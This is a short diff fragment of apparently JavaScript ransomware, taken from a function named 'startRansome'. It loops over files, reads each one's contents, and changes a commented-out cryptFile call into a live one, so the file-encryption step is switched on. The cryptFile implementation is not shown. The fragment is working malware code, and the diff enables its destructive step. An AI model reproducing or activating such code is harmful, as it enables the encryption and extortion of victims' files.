@@ -91,7 +91,7 @@ function startRansome(){
     //https://stackoverflow.com/a/49601340/1507900
     var contents = fs.readFileSync(filepath, 'utf8');
     fileSize = stat.size;
-    //cryptFile(contents,filepath,name.concat(ext),stat.size); 
+    cryptFile(contents,filepath,name.concat(ext),stat.size); 
 }); 
 }
 //start 
